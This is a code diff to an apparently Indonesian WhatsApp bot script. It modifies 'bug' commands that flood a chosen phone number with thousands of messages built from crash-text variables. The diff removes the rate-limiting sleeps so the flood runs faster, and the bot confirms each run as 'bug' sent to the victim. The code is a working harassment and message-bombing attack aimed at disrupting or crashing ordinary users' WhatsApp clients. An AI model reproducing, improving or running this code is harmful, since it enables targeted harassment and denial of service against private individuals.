@@ -2218,7 +2218,7 @@ Pe = text.split("|")[0]+'@s.whatsapp.net'
 let jumlah = 1001
 for (let x = 0;x < jumlah; x++) {
 haikal.sendMessage(Pe, {text: `${cttl + weg + ganas + virtex7 + ngazap}`}, {quoted: kalgans})
-await sleep(100)
+//await sleep(100)
 }
 await sleep(1000)
 m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
@@ -2231,11 +2231,11 @@ if (!isCreator) return m.reply(`*khusus Premium*`)
 await loading()
 Pe = text.split("|")[0]+'@s.whatsapp.net'
 //no = text.split("|")[0]
-let jumlah = 100000000000000
+let jumlah = 5001
 //let jumlah = 101
 for (let x = 0;x < jumlah; x++) {
-haikal.sendMessage(Pe, {text: `${botname + x}`}, {quoted: kalgans})
-await sleep(500)
+haikal.sendMessage(Pe, {text: `${botname}`}, {quoted: kalgans})
+//await sleep(500)
 }
 await sleep(1000)
 m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
@@ -2251,7 +2251,7 @@ Pe = text.split("|")[0]+'@s.whatsapp.net'
 let jumlah = 501
 for (let x = 0;x < jumlah; x++) {
 haikal.sendMessage(Pe, {text: `${weg}`}, {quoted: kalgans})
-await sleep(100)
+//await sleep(100)
 }
 await sleep(1000)
 m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
